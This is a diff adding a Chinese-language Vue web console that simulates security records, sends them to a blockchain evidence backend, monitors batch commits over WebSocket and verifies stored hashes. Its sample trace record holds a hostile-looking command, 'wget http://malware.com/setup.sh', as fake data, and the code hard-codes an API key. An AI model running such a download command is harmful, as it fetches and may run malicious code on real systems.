@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>区块链业务综合控制台</title>
+    <!-- 引入 Vue 和相关库 -->
+    <script src="https://cdn.bootcdn.net/ajax/libs/vue/2.6.14/vue.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/axios/0.21.1/axios.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/sockjs-client/1.5.1/sockjs.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/stomp.js/2.3.3/stomp.min.js"></script>
+    
+    <style>
+        :root { --primary: #1890ff; --bg: #f0f2f5; --card-bg: #fff; --text: #333; --sidebar-bg: #001529; --sidebar-text: #fff; }
+        body { margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Sidebar */
+        aside { width: 260px; background: var(--sidebar-bg); color: var(--sidebar-text); display: flex; flex-direction: column; flex-shrink: 0; box-shadow: 2px 0 6px rgba(0,21,41,0.35); z-index: 10; }
+        aside h1 { margin: 0; padding: 20px; font-size: 18px; border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; gap: 10px; font-weight: 600; }
+        .menu { flex: 1; padding: 12px 0; overflow-y: auto; }
+        .menu-group { padding: 8px 16px; font-size: 12px; color: rgba(255,255,255,0.45); margin-top: 8px; }
+        .menu-item { padding: 12px 24px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 10px; opacity: 0.8; font-size: 14px; }
+        .menu-item:hover { opacity: 1; background: rgba(255,255,255,0.1); }
+        .menu-item.active { background: var(--primary); opacity: 1; }
+        
+        /* Main Content */
+        main { flex: 1; display: flex; flex-direction: column; padding: 20px; gap: 20px; overflow-y: auto; position: relative; }
+        
+        .card { background: var(--card-bg); border-radius: 8px; padding: 24px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); transition: 0.3s; }
+        .card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #f0f0f0; padding-bottom: 16px; }
+        .card-title { font-size: 18px; font-weight: 600; color: #1f1f1f; display: flex; align-items: center; gap: 8px; }
+        
+        /* Forms */
+        .form-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
+        label { font-size: 13px; color: #666; display: block; margin-bottom: 6px; }
+        input, textarea, select { width: 100%; padding: 8px 12px; border: 1px solid #d9d9d9; border-radius: 4px; box-sizing: border-box; font-family: inherit; transition: 0.2s; }
+        input:focus, textarea:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 2px rgba(24,144,255,0.2); }
+        textarea { font-family: 'Menlo', 'Monaco', 'Courier New', monospace; min-height: 300px; line-height: 1.5; font-size: 13px; }
+        
+        /* Buttons */
+        .btn { padding: 8px 16px; border: 1px solid #d9d9d9; border-radius: 4px; background: #fff; cursor: pointer; transition: 0.2s; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
+        .btn:hover { color: var(--primary); border-color: var(--primary); }
+        .btn-primary { background: var(--primary); color: white; border-color: var(--primary); }
+        .btn-primary:hover { background: #40a9ff; border-color: #40a9ff; color: white; }
+        .btn:disabled { cursor: not-allowed; opacity: 0.6; }
+        
+        /* Status & Logs */
+        .status-bar { margin-top: 16px; padding: 12px; border-radius: 4px; font-size: 13px; display: none; }
+        .status-bar.show { display: block; }
+        .status-bar.success { background: #f6ffed; border: 1px solid #b7eb8f; color: #52c41a; }
+        .status-bar.error { background: #fff2f0; border: 1px solid #ffccc7; color: #ff4d4f; }
+        
+        .log-box { height: 400px; overflow-y: auto; background: #282c34; color: #abb2bf; padding: 16px; border-radius: 6px; font-family: 'Menlo', monospace; font-size: 12px; line-height: 1.6; }
+        .log-item { margin-bottom: 6px; border-bottom: 1px dashed #3e4451; padding-bottom: 4px; display: flex; gap: 10px; }
+        .log-time { color: #61afef; min-width: 80px; }
+        .log-content { flex: 1; word-break: break-all; }
+        
+        /* Tables */
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #e8e8e8; font-size: 14px; }
+        th { background-color: #fafafa; font-weight: 600; color: #555; }
+        tr:hover { background: #fafafa; }
+        
+        /* Badge */
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 12px; font-weight: bold; }
+        .badge-green { background: #f6ffed; color: #52c41a; border: 1px solid #b7eb8f; }
+        .badge-red { background: #fff2f0; color: #ff4d4f; border: 1px solid #ffccc7; }
+        
+        /* Toast */
+        .toast { position: fixed; top: 20px; right: 20px; background: white; padding: 16px 24px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 1000; display: flex; align-items: center; gap: 12px; animation: slideIn 0.3s ease-out; border-left: 4px solid var(--primary); }
+        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div id="app" style="display: flex; width: 100%; height: 100%;">
+    
+    <!-- 左侧导航栏 -->
+    <aside>
+        <h1><span>🔗</span> 业务区块链控制台</h1>
+        <div class="menu">
+            <div class="menu-group">实时监控</div>
+            <div class="menu-item" :class="{ active: currentView === 'monitor' }" @click="switchView('monitor')">
+                <span>👀</span> 实时监控看板
+                <span v-if="!wsConnected" style="width: 8px; height: 8px; background: #ff4d4f; border-radius: 50%; margin-left: auto;"></span>
+                <span v-else style="width: 8px; height: 8px; background: #52c41a; border-radius: 50%; margin-left: auto;"></span>
+            </div>
+            
+            <div class="menu-group">数据模拟 (Simulation)</div>
+            <div class="menu-item" :class="{ active: currentView === 'sim' && simType === 'ORG' }" @click="switchSim('ORG')">
+                <span>🏢</span> 组织信息 (Org)
+            </div>
+            <div class="menu-item" :class="{ active: currentView === 'sim' && simType === 'ALERT' }" @click="switchSim('ALERT')">
+                <span>🚨</span> 威胁告警 (Alert)
+            </div>
+            <div class="menu-item" :class="{ active: currentView === 'sim' && simType === 'TRAFFIC' }" @click="switchSim('TRAFFIC')">
+                <span>📉</span> 流量统计 (Traffic)
+            </div>
+            <div class="menu-item" :class="{ active: currentView === 'sim' && simType === 'REPORT' }" @click="switchSim('REPORT')">
+                <span>📑</span> 报表配置 (Report)
+            </div>
+            <div class="menu-item" :class="{ active: currentView === 'sim' && simType === 'TRACE' }" @click="switchSim('TRACE')">
+                <span>🔍</span> 溯源信息 (Trace)
+            </div>
+        </div>
+    </aside>
+
+    <!-- 右侧主内容区 -->
+    <main>
+        
+        <!-- 全局 WebSocket 状态提示 (仅当未连接时显示在顶部) -->
+        <div v-if="!wsConnected" style="background: #fff2f0; border: 1px solid #ffccc7; color: #ff4d4f; padding: 10px 20px; border-radius: 4px; display: flex; align-items: center; gap: 10px;">
+            <span>⚠️ WebSocket 未连接，正在尝试重连...</span>
+        </div>
+
+        <!-- 视图：数据模拟器 -->
+        <div v-show="currentView === 'sim'" class="card">
+            <div class="card-header">
+                <div class="card-title">
+                    <span>🎲</span> 模拟生成：{{ getSimTitle(simType) }}
+                </div>
+                <button class="btn" @click="generateSimData">
+                    <span>🔄</span> 随机生成数据
+                </button>
+            </div>
+            
+            <div class="form-grid">
+                <div style="display: flex; gap: 16px;">
+                    <div style="flex: 1;">
+                        <label>请求 URL</label>
+                        <input :value="getApiUrl(simType)" readonly style="background: #f5f5f5; color: #666;">
+                    </div>
+                    <div style="display: flex; gap: 8px; align-items: flex-end;">
+                        <div style="width: 200px;">
+                            <label>操作</label>
+                            <button class="btn btn-primary" style="width: 100%; justify-content: center;" @click="submitSimData" :disabled="loading">
+                                <span v-if="!loading">🚀 发送上链请求</span>
+                                <span v-else>⏳ 处理中...</span>
+                            </button>
+                        </div>
+                        <div style="width: 200px;">
+                            <label style="visibility:hidden">操作</label>
+                            <button class="btn" style="width: 100%; justify-content: center;" @click="burstSend" :disabled="loading">
+                                ⚡ 连发10条
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <label>请求体 JSON (可手动修改)</label>
+                    <textarea v-model="simJson" spellcheck="false"></textarea>
+                </div>
+            </div>
+
+            <!-- 请求结果状态 -->
+            <div class="status-bar" :class="[submitStatus.type, { show: submitStatus.msg }]">
+                {{ submitStatus.msg }}
+            </div>
+            
+            <div v-if="submitResponse" style="margin-top: 16px;">
+                <label>后端响应预览</label>
+                <pre style="background:#f5f5f5; padding:12px; border-radius:4px; font-size:12px; overflow-x: auto;">{{ JSON.stringify(submitResponse, null, 2) }}</pre>
+            </div>
+        </div>
+
+        <!-- 视图：实时监控 -->
+        <div v-show="currentView === 'monitor'">
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">
+                        <span>🚀</span> 实时上链通知 (订阅 /topic/alerts)
+                    </div>
+                    <div class="badge" :class="wsConnected ? 'badge-green' : 'badge-red'">
+                        {{ wsConnected ? '已连接' : '断开' }}
+                    </div>
+                </div>
+                    <div class="log-box">
+                    <div v-for="(log, index) in logs" :key="index" class="log-item">
+                        <span class="log-time">[{{ formatTime(log.timestamp) }}]</span>
+                        <span class="log-content">
+                            <span v-if="log.type === 'BATCH_SUCCESS'" style="color: #98c379;">
+                                ✅ 批量上链成功 | TxID: {{ log.txId }} | 数量: {{ log.count }} | 用时: {{ log.durationMs }}ms | 队列剩余: {{ log.queueSizeAfter }} | 样本: {{ (log.sampleEventIds || []).join(', ') }}
+                                <button class="btn" @click="log.expanded = !log.expanded" style="padding:2px 6px; font-size:12px; margin-left:8px;">详情</button>
+                                <pre v-if="log.expanded" style="background:#1e222a; color:#c9d1d9; padding:8px; border-radius:4px; margin-top:6px;">{{ JSON.stringify(log, null, 2) }}</pre>
+                            </span>
+                            <span v-else-if="log.type === 'BATCH_FAILED'" style="color: #e06c75;">
+                                ❌ 批量失败 | 重试: {{ log.requeued }} | 丢弃: {{ log.dropped }} | 错误: {{ log.error }}
+                                <button class="btn" @click="log.expanded = !log.expanded" style="padding:2px 6px; font-size:12px; margin-left:8px;">详情</button>
+                                <pre v-if="log.expanded" style="background:#1e222a; color:#c9d1d9; padding:8px; border-radius:4px; margin-top:6px;">{{ JSON.stringify(log, null, 2) }}</pre>
+                            </span>
+                            <span v-else>
+                                {{ JSON.stringify(log) }}
+                            </span>
+                        </span>
+                    </div>
+                    <div v-if="logs.length === 0" style="color: #5c6370; text-align: center; margin-top: 150px;">
+                        Waiting for messages...
+                    </div>
+                    </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header" style="border-bottom: none; padding-bottom: 0;">
+                    <div class="card-title"><span>📊</span> 链上存证查询</div>
+                    <div style="display: flex; gap: 10px;">
+                        <select v-model="queryType" style="width: 200px;">
+                            <option value="ORG">组织信息 (ORG)</option>
+                            <option value="ALERT">威胁告警 (ALERT)</option>
+                            <option value="TRAFFIC">流量统计 (TRAFFIC)</option>
+                            <option value="REPORT">报表配置 (REPORT)</option>
+                            <option value="TRACE">溯源信息 (TRACE)</option>
+                        </select>
+                        <button class="btn btn-primary" @click="fetchChainData" :disabled="queryLoading">
+                            {{ queryLoading ? '查询中...' : '查询' }}
+                        </button>
+                        <input v-model="singleId" placeholder="输入 EventID，例如 ORG_123" style="width: 280px;" />
+                        <button class="btn" @click="fetchSingleEvidence" :disabled="singleLoading">
+                            {{ singleLoading ? '单体查询中...' : '单体查询' }}
+                        </button>
+                    </div>
+                </div>
+                <div style="overflow-x: auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Event ID / Key</th>
+                                <th>Hash / Data Preview</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr v-for="(item, idx) in tableData" :key="idx">
+                                <td style="font-family: monospace;">{{ item.eventID || item.key || item.id }}</td>
+                                <td style="font-family: monospace; font-size: 12px; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" :title="JSON.stringify(item)">
+                                    {{ item.dataHash || item.metadata || JSON.stringify(item) }}
+                                </td>
+                                <td>{{ item.timestamp || item.createTime || '-' }}</td>
+                            </tr>
+                            <tr v-if="tableData.length === 0">
+                                <td colspan="3" style="text-align: center; color: #999; padding: 30px;">
+                                    暂无数据 (请确保合约支持 Rich Query 且有数据上链)
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <div v-if="singleResult" style="margin-top: 12px;">
+                        <div style="font-weight: 600; font-size: 14px; margin-bottom: 6px;">单体查询结果</div>
+                        <pre style="background:#f5f5f5; padding:12px; border-radius:4px; font-size:12px; overflow-x: auto;">{{ JSON.stringify(singleResult, null, 2) }}</pre>
+                    </div>
+                    <div style="margin-top: 12px; display: flex; gap: 10px; align-items: flex-end;">
+                        <div style="flex: 0 0 240px;">
+                            <label>校验 EventID</label>
+                            <input v-model="verifyEventId" placeholder="如 ORG_123">
+                        </div>
+                        <div style="flex: 0 0 320px;">
+                            <label>本地哈希 (dataHash)</label>
+                            <input v-model="verifyHash" placeholder="粘贴/填写本地哈希">
+                        </div>
+                        <div style="flex: 0 0 160px;">
+                            <label style="visibility:hidden">操作</label>
+                            <button class="btn btn-primary" @click="runVerify" :disabled="verifyLoading">
+                                {{ verifyLoading ? '校验中...' : '校验哈希' }}
+                            </button>
+                        </div>
+                        <div style="flex: 0 0 160px;">
+                            <label style="visibility:hidden">操作</label>
+                            <button class="btn" @click="fillFromSingleResult" :disabled="!singleResult">
+                                从单体查询填充
+                            </button>
+                        </div>
+                    </div>
+                    <div v-if="verifyResult" style="margin-top: 8px;">
+                        <div style="font-weight: 600; font-size: 14px; margin-bottom: 6px;">校验结果</div>
+                        <pre style="background:#f5f5f5; padding:12px; border-radius:4px; font-size:12px; overflow-x: auto;">{{ JSON.stringify(verifyResult, null, 2) }}</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- 全局 Toast -->
+    <div v-if="showToast" class="toast">
+        <span style="font-size: 20px;">🔔</span>
+        <div>
+            <div style="font-weight: 600; font-size: 14px;">新消息提醒</div>
+            <div style="font-size: 12px; color: #666;">{{ toastMessage }}</div>
+        </div>
+        <button @click="showToast = false" style="border:none; background:none; cursor:pointer; font-size:16px; color:#999;">&times;</button>
+    </div>
+
+</div>
+
+<script>
+    const API_CONFIG = {
+        'ORG': { url: '/api/chain/org', title: '组织信息 (OrgInfo)' },
+        'ALERT': { url: '/api/chain/alert', title: '威胁告警 (ThreatAlert)' },
+        'TRAFFIC': { url: '/api/chain/traffic', title: '流量统计 (TrafficStat)' },
+        'REPORT': { url: '/api/chain/report', title: '报表配置 (ReportConfig)' },
+        'TRACE': { url: '/api/chain/trace', title: '溯源信息 (SourceTracing)' }
+    };
+
+    new Vue({
+        el: '#app',
+        data: {
+            currentView: 'sim', // 'sim' | 'monitor'
+            simType: 'ORG',
+            simJson: '',
+            loading: false,
+            submitStatus: { type: '', msg: '' },
+            submitResponse: null,
+            
+            // Monitor State
+            wsConnected: false,
+            logs: [],
+            queryType: 'ORG',
+            tableData: [],
+            queryLoading: false,
+            singleId: '',
+            singleLoading: false,
+            singleResult: null,
+            verifyEventId: '',
+            verifyHash: '',
+            verifyLoading: false,
+            verifyResult: null,
+            
+            // Toast
+            showToast: false,
+            toastMessage: ''
+        },
+        mounted() {
+            // 配置 Axios 鉴权头
+            axios.defaults.headers.common['X-API-KEY'] = 'secret-api-key';
+            
+            this.generateSimData();
+            this.connectWs();
+        },
+        methods: {
+            // --- Navigation ---
+            switchView(view) {
+                this.currentView = view;
+            },
+            switchSim(type) {
+                this.currentView = 'sim';
+                this.simType = type;
+                this.generateSimData();
+                this.submitStatus = { type: '', msg: '' };
+                this.submitResponse = null;
+            },
+            getSimTitle(type) { return API_CONFIG[type].title; },
+            getApiUrl(type) { return API_CONFIG[type].url; },
+
+            // --- Simulation Logic ---
+            generateSimData() {
+                const now = new Date();
+                const timeStr = now.toISOString().replace('T', ' ').split('.')[0];
+                const randomId = Math.floor(Math.random() * 10000);
+                let data = {};
+
+                if (this.simType === 'ORG') {
+                    data = {
+                        id: randomId,
+                        orgId: "ORG_" + Math.floor(Math.random() * 100),
+                        orgName: ["研发部", "市场部", "运维中心", "安全部"][Math.floor(Math.random() * 4)],
+                        memberCount: Math.floor(Math.random() * 200) + 10,
+                        adminPermission: Math.random() > 0.5 ? 1 : 0,
+                        createTime: timeStr,
+                        updateTime: timeStr
+                    };
+                } else if (this.simType === 'ALERT') {
+                    data = {
+                        id: randomId,
+                        threatId: "THREAT-" + Date.now().toString().slice(-6),
+                        threatLevel: Math.floor(Math.random() * 5) + 1,
+                        impactScope: ["Internal", "External", "DMZ"][Math.floor(Math.random() * 3)],
+                        occurTime: timeStr,
+                        createTime: timeStr
+                    };
+                } else if (this.simType === 'TRAFFIC') {
+                    data = {
+                        id: randomId,
+                        attackType: ["DDoS", "SQL Injection", "XSS", "Brute Force"][Math.floor(Math.random() * 4)],
+                        sourceIp: `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                        targetIp: `10.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                        statTime: timeStr,
+                        attackCount: Math.floor(Math.random() * 1000),
+                        createTime: timeStr
+                    };
+                } else if (this.simType === 'REPORT') {
+                    data = {
+                        id: randomId,
+                        reportType: ["Daily", "Weekly", "Monthly", "Audit"][Math.floor(Math.random() * 4)],
+                        startTime: timeStr,
+                        endTime: timeStr,
+                        reportStatus: 1,
+                        reportUrl: "http://oss.example.com/report/" + randomId + ".pdf",
+                        createTime: timeStr,
+                        updateTime: timeStr
+                    };
+                } else if (this.simType === 'TRACE') {
+                    data = {
+                        id: randomId,
+                        threatSource: ["Unknown", "APT Group", "Insider", "Script Kiddie"][Math.floor(Math.random() * 4)],
+                        maliciousIp: `203.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                        attackCmd: "wget http://malware.com/setup.sh",
+                        malwareOrigin: "MD5: " + Math.random().toString(36).substring(2),
+                        attackPath: "/var/www/html/upload",
+                        flowCharm: "TCP Payload Analysis...",
+                        createTime: timeStr
+                    };
+                }
+                this.simJson = JSON.stringify(data, null, 4);
+            },
+            
+            async submitSimData() {
+                this.loading = true;
+                this.submitStatus = { type: '', msg: '' };
+                this.submitResponse = null;
+                
+                try {
+                    // Parse first to validate
+                    const payload = JSON.parse(this.simJson);
+                    const url = this.getApiUrl(this.simType);
+                    
+                    const res = await axios.post(url, payload);
+                    this.submitResponse = res.data;
+                    
+                    if (res.data.status === 'success' || res.data.txId) {
+                        this.submitStatus = { type: 'success', msg: `✅ 请求成功! TxID: ${res.data.txId || 'N/A'}` };
+                    } else {
+                        throw new Error(res.data.message || 'Unknown error');
+                    }
+                } catch (e) {
+                    let msg = e.message;
+                    if (e.response && e.response.data && e.response.data.message) {
+                        msg = e.response.data.message;
+                    }
+                    this.submitStatus = { type: 'error', msg: `❌ 请求失败: ${msg}` };
+                } finally {
+                    this.loading = false;
+                }
+            },
+
+            async burstSend() {
+                if (this.loading) return;
+                this.loading = true;
+                this.submitStatus = { type: '', msg: '' };
+                this.submitResponse = null;
+                try {
+                    const base = JSON.parse(this.simJson);
+                    const url = this.getApiUrl(this.simType);
+                    const count = 10;
+                    const start = performance.now();
+                    const reqs = [];
+                    for (let i = 0; i < count; i++) {
+                        const payload = JSON.parse(JSON.stringify(base));
+                        const now = new Date();
+                        const timeStr = now.toISOString().replace('T', ' ').split('.')[0];
+                        payload.createTime = timeStr;
+                        if (payload.updateTime !== undefined) payload.updateTime = timeStr;
+                        payload.id = typeof payload.id === 'number' ? payload.id + i + Math.floor(Math.random() * 1000) : Math.floor(Math.random() * 1000000);
+                        if (this.simType === 'ORG') {
+                            payload.orgId = 'ORG_' + Math.floor(Math.random() * 100000);
+                        } else if (this.simType === 'ALERT') {
+                            payload.threatId = 'THREAT-' + Date.now() + '-' + i;
+                        } else if (this.simType === 'TRAFFIC') {
+                            payload.statTime = timeStr;
+                        } else if (this.simType === 'REPORT') {
+                            payload.reportUrl = 'http://oss.example.com/report/' + payload.id + '.pdf';
+                        }
+                        reqs.push(axios.post(url, payload));
+                    }
+                    const results = await Promise.all(reqs.map(p => p.catch(e => ({ error: e }))));
+                    const ok = results.filter(r => r && r.data && (r.data.status === 'success' || r.data.txId)).length;
+                    const end = performance.now();
+                    this.submitStatus = { type: 'success', msg: `✅ 连发${count}条，成功${ok}条，用时${Math.round(end - start)}ms` };
+                    this.toastMessage = `已连发${count}条，后台批处理进行中`;
+                    this.showToast = true;
+                } catch (e) {
+                    let msg = e.message;
+                    if (e.response && e.response.data && e.response.data.message) {
+                        msg = e.response.data.message;
+                    }
+                    this.submitStatus = { type: 'error', msg: `❌ 连发失败: ${msg}` };
+                } finally {
+                    this.loading = false;
+                }
+            },
+
+            // --- WebSocket & Monitor Logic ---
+            connectWs() {
+                const socket = new SockJS('/ws');
+                this.stompClient = Stomp.over(socket);
+                this.stompClient.debug = null; // Quiet mode
+                
+                this.stompClient.connect({}, (frame) => {
+                    this.wsConnected = true;
+                    console.log('WS Connected');
+                    
+                    this.stompClient.subscribe('/topic/alerts', (message) => {
+                        const body = JSON.parse(message.body);
+                        this.handleIncomingMessage(body);
+                    });
+                }, (error) => {
+                    console.error('WS Error', error);
+                    this.wsConnected = false;
+                    setTimeout(() => this.connectWs(), 5000);
+                });
+            },
+            
+            handleIncomingMessage(msg) {
+                // Add to log
+                msg.expanded = false;
+                this.logs.unshift(msg);
+                if (this.logs.length > 200) this.logs.pop();
+                
+                // Show toast if not in monitor view
+                if (this.currentView !== 'monitor') {
+                    this.toastMessage = msg.type === 'BATCH_SUCCESS' 
+                        ? `批量上链成功 (${msg.count} 条)` 
+                        : (msg.type === 'BATCH_FAILED' ? `批量失败，重试${msg.requeued}条` : '收到新的链上消息');
+                    this.showToast = true;
+                    setTimeout(() => { this.showToast = false; }, 3000);
+                }
+            },
+            
+            formatTime(ts) {
+                if (!ts) return '-';
+                return new Date(ts).toLocaleTimeString();
+            },
+            
+            async fetchChainData() {
+                this.queryLoading = true;
+                try {
+                    const res = await axios.get('/api/chain/list/' + this.queryType);
+                    if (res.data.status === 'success') {
+                        this.tableData = res.data.data || [];
+                    } else {
+                        alert('查询失败: ' + res.data.message);
+                    }
+                } catch (e) {
+                    console.error(e);
+                    alert('查询异常，请检查后端日志');
+                } finally {
+                    this.queryLoading = false;
+                }
+            },
+
+            async fetchSingleEvidence() {
+                if (!this.singleId) {
+                    alert('请输入 EventID');
+                    return;
+                }
+                this.singleLoading = true;
+                try {
+                    const res = await axios.get('/api/evidence/' + encodeURIComponent(this.singleId));
+                    if (res.data.status === 'success') {
+                        this.singleResult = res.data.data || null;
+                    } else {
+                        this.singleResult = null;
+                        alert('查询失败: ' + (res.data.message || ''));
+                    }
+                } catch (e) {
+                    console.error(e);
+                    this.singleResult = null;
+                    alert('查询异常，请检查后端日志');
+                } finally {
+                    this.singleLoading = false;
+                }
+            },
+
+            async runVerify() {
+                if (!this.verifyEventId || !this.verifyHash) {
+                    alert('请输入 EventID 和 本地哈希');
+                    return;
+                }
+                this.verifyLoading = true;
+                try {
+                    const payload = { eventID: this.verifyEventId, dataHash: this.verifyHash };
+                    const res = await axios.post('/api/verify', payload);
+                    if (res.data.status === 'success') {
+                        this.verifyResult = res.data;
+                        this.toastMessage = res.data.isMatch ? '哈希匹配' : '哈希不匹配';
+                        this.showToast = true;
+                        setTimeout(() => { this.showToast = false; }, 3000);
+                    } else {
+                        this.verifyResult = null;
+                        alert('校验失败: ' + (res.data.message || ''));
+                    }
+                } catch (e) {
+                    console.error(e);
+                    this.verifyResult = null;
+                    alert('校验异常，请检查后端日志');
+                } finally {
+                    this.verifyLoading = false;
+                }
+            },
+
+            fillFromSingleResult() {
+                if (!this.singleResult) return;
+                const id = this.singleResult.eventID || this.singleResult.id || '';
+                const hash = this.singleResult.dataHash || '';
+                this.verifyEventId = id;
+                this.verifyHash = hash;
+            }
+        }
+    });
+</script>
+
+</body>
+</html>
